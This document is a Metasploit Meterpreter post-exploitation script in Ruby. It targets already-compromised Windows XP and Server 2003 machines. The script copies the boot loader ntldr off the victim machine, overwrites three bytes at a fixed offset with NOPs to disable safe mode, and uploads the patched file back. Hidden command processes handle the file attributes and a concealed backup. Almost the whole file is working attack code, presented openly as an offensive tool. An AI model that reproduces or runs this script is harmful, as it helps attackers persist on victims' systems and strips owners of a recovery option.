# $Id: nosafe.rb 14034 2012-2-27 moloch $ 
# Meterpreter script which disables safe mode on Windows XP / 2k3 boxes
#
#  Author: Moloch
# Version: 0.1
################## Variable Declarations ##################
@client = client
@ntldr_xp_sp3 = "c1b29b4e6eea9510610db2ec4d6db160"
@patch_xp_sp3 = ""

@ntldr_xp_sp2 = "5009eae5f826225254596ce204ff9d36"

@ntldr_2k3_sp = ""

@offset = 1915
@tmp_path = "/tmp/mtrptr"
@make_backup = true
@ignore_hash = false

@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-nb"  => [ false,   "Do NOT create a backup of the ntdlr prior to patching"],
	"-i"  => [ false,   "Patch the ntldr regardless of version"]
)

def usage
	print_line "Meterpreter script to disable safe mode by patching the ntldr on XP / 2k3 boxes"
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end

################## Functions ##################
def backup_ntldr
	random = sprintf("%.5d",rand(100000))
	print_status("Creating a backup of ntldr ...")
	@client.sys.process.execute("cmd /c copy C:\\ntldr C:\\ntldr#{random}.back",nil, {'Hidden' => true})

	@client.sys.process.execute("cmd /c attrib +h C:\\ntldr#{random}.back",nil, {'Hidden' => true})	
end

def patch_ntldr
	ntldr = ::File.open(@tmp_path + "/ntldr", "rb") {|io| io.read}
	ntldr[@offset]     = "\x90"
	ntldr[@offset + 1] = "\x90"
	ntldr[@offset + 2] = "\x90"
	patch = ::File.new(@tmp_path + "/ntldr_patched", "wb")
	patch.write(ntldr)
	patch.close()
end

def no_safe
	if @make_backup
		backup_ntldr()
	end	
	print_status("Downloading remote ntldr ...")
	@client.fs.file.download(@tmp_path + "/ntldr", "C:\\ntldr")	
	if ::File.exists?(@tmp_path + "/ntldr")
		print_status("Patching ntldr locally ...")
		patch_ntldr()
		print_status("Uploading patched ntldr to remote system ...")
		@client.sys.process.execute("cmd /c attrib -s -h -a -r C:\\ntldr", nil, {'Hidden' => true})	
		@client.fs.file.upload_file("C:\\ntldr", @tmp_path + "/ntldr_patched")
		@client.sys.process.execute("cmd /c attrib +s +h +a +r C:\\ntldr", nil, {'Hidden' => true})
		new_hash = file_remote_digestmd5("C:\\ntldr")
		if not @ntldr_hash.eql? new_hash
			print_status("Ntldr hash is now #{new_hash}")
			print_good("Successfully patched ntldr, no more safe mode :D")
		else
			print_error("Hash did not change, something went wrong :(")
		end
	else
		print_error("Failed to download remote ntldr")
		raise Rex::Script::Completed		
	end
end

########### Start Evil ###########
@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage()
	when "-nb"
		@make_backup = false
	when "-i"
		@ignore_hash = true
	end
}

@ntldr_hash = file_remote_digestmd5("C:\\ntldr")
print_status("Current ntldr hash #{@ntldr_hash}")

if @ntldr_xp_sp3.eql?  @ntldr_hash
	version = "Windows XP - Sp3"
elsif @ntldr_xp_sp2.eql? @ntldr_hash
	version = "Windows XP - Sp2"
elsif @ignore_hash
	version = "Reckless Hacker"
else
	print_error("Unknown ntldr version")
	raise Rex::Script::Completed
end

print_good("Found a known ntldr version #{version}")
no_safe()

#Eof

